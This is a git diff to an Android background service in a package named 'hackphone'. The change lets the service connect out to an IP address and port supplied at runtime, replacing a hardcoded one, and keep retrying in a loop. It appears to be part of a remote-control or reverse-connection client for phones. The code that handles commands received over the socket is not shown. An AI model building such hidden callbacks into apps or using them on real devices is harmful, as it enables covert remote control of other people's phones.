@@ -15,6 +15,8 @@ import android.util.Log;
 
 public class ServMain extends Service  {
 	private static final String TAG = "ServMain" ;
+	private String mip;
+	private int mport= 0;
 	public static final String ACTION = "com.chidacan.hackphone.ServMain";
 	private MyThread threadSocket;
 
@@ -27,6 +29,8 @@ public class ServMain extends Service  {
 	@Override
 	public int onStartCommand(Intent intent, int flags, int startId) {
 		Log.v(TAG, "ServiceDemo onStartCommand");
+		mip = intent.getStringExtra("ip");
+		mport = intent.getIntExtra("port", 0);
 		return super.onStartCommand(intent, flags, startId);
 	}
 	 
@@ -38,9 +42,11 @@ public class ServMain extends Service  {
             	Log.v(TAG, "ServiceDemo Thread Run");
             	do{
 	            	Socket s = null;
+	            	if(mport == 0 || mip == null){sleep(1000);continue;};
             		try{
             			Log.v(TAG, "ServiceDemo Socket connecting");
-		            	s = new Socket("192.168.18.100",1996);
+            			Log.v(TAG,mip);
+		            	s = new Socket(mip,mport);
 		            	OutputStream ou = s.getOutputStream(); 
 		            	BufferedReader bff = new BufferedReader(new InputStreamReader( s.getInputStream()));
 		            	do{
